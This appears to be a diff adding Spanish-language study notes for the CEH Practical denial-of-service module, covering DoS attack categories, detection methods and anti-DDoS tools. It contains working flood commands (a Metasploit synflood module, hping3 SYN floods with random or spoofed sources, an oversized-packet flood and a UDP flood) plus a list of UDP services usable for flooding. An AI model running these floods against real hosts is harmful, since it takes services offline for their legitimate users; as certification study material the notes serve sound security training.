@@ -1,0 +1,101 @@
+CEH Practical Notes
+------------------------------------------
+Modulo 10 - Denial of Service
+------------------------------------------
+
+# Ataques volumétricos : consumen el ancho de banda de la red o servicio objetivo
+
+	+ Técnicas de ataque:
+	
+		- Ataque de inundación UDP
+		- Ataque de inundación ICMP
+		- Ping of Death y ataque de los pitufos
+		- Onda de pulso y ataque de día cero
+
+# Ataques de protocolo : consumen recursos como tablas de estado de conexión presentes en los componentes de la infraestructura de red, como equilibradores de carga, cortafuegos y servidores de aplicaciones.
+
+	+ Técnicas de ataque:
+
+		- Ataque de inundación SYN
+		- Ataque de fragmentación
+		- Ataque de inundación de sesión falsificada
+		- Ataque de inundación ACK
+
+# Ataques a la capa de aplicación : consumen recursos o servicios de aplicaciones, por lo que no están disponibles para otros usuarios legítimos.
+
+	+ Técnicas de ataque:
+
+		- Ataque HTTP GET / POST
+		- Ataque de Slowloris
+		- Ataque de inundación de la capa de aplicación UDP
+
+1 - Perform DoS and DDoS attacks using various Techniques
+	1.1 - Perform a DoS attack (SYN flooding) on a target host using Metasploit
+		
+		># msfconsole
+		># use auxiliary/dos/tcp/synflood
+		># show options
+		># set (RHOSTS, RPORT, SHOST)
+		># exploit
+
+	1.2 - Perform a DoS attack on a target host using hping3
+
+		# Ataque DoS Origen Aleatorio
+			
+			># hping3 -S -p 80 --flood --rand-source X.X.X.X
+
+				- S: Establece la flag SYN
+				- p: Establece puerto de destino para enviar paquetes.
+				- flood: Realiza inundación con parámetros establecidos, en este caso SYN Flood.
+				- rand-source: Habilita el modo de origen aleatorio.
+			
+		# Ataque DoS Origen Específico
+
+			># hping3 -S -p 21 --flood -a [IP ORIGEN FALSA] X.X.X.X
+
+				- a: Dirección IP origen falsa
+			
+		# Ataque DoS POD (Aumenta el consumo de la máquina víctima)
+
+			En un ataque PoD, el atacante intenta bloquear, congelar o desestabilizar el sistema o servicio objetivo enviando paquetes mal formados o de gran tamaño mediante un simple comando ping. Por ejemplo, el atacante envía un paquete que tiene un tamaño de 65.538 bytes al servidor web de destino. Este tamaño de paquete excede el límite de tamaño prescrito por RFC 791 IP, que es 65.535 bytes. El proceso de reensamblaje del sistema receptor puede hacer que el sistema falle.
+
+			># hping3 -d 65538 -S -p 21 --flood X.X.X.X
+
+				- d: Especifica el tamaño de los paquetes a enviar (Reduce el rendimiento de la máquina destino)
+				
+		# Ataque DoS Inundación de capa 7 (aplicación) UDP
+
+			Algunos protocolos de capa aplicación basados en UDP que los atacantes pueden emplear para inundar las redes objetivo:
+
+			- CharGEN (puerto 19)
+			- SNMPv2 (puerto 161)
+			- QOTD (puerto 17)
+			- RPC (puerto 135)
+			- SSDP (puerto 1900)
+			- CLDAP (puerto 389)
+			- TFTP (puerto 69)
+			- NetBIOS (puerto 137,138,139)
+			- NTP (puerto 123)
+			- Protocolo de red Quake (puerto 26000)
+			- VoIP (puerto 5060)
+
+			># hping3 -2 -p 139 --flood X.X.X.X
+
+				- -2: Especifica el modo UDP.
+
+	1.3 - Perform a DDoS attack using HOIC
+	1.4 - Perform a DDoS attack using LOIC
+	
+2 - Detect and protect against DoS and DDoS attacks
+	
+	# Los siguientes son los tres tipos de técnicas de detección:
+
+		- Perfiles de actividad : perfiles basados en la tasa de paquetes promedio para un flujo de red, que consta de paquetes consecutivos con información de encabezado de paquete similar
+		- Detección secuencial de puntos de cambio : filtra el tráfico de la red por direcciones IP, números de puerto específicos y protocolos de comunicación utilizados, y almacena los datos del flujo de tráfico en un gráfico que muestra la velocidad del flujo de tráfico a lo largo del tiempo.
+		- Análisis de señales basado en ondas : analiza el tráfico de la red en términos de componentes espectrales
+
+	2.1 - Detect and protect against DDoS attacks using Anti DDoS Guardian
+
+		# En Anti-DDoS Guardian, podemos visualizar que máquina remota está realizando un ataque DDoS y visualizar el tráfico que genera (incoming/outgoing), a su vez, podemos bloquear dichas direcciones IP remotas.
+
+		# También puede utilizar otras herramientas de protección DoS y DDoS como Imperva Incapsula DDoS Protection (https://www.incapsula.com), el servicio de protección DDoS de DOSarrest (https://www.dosarrest.com), DDoS-GUARD (https: //ddos-guard.net) y Cloudflare (https://www.cloudflare.com) para proteger los sistemas y redes de la organización de ataques DoS y DDoS.
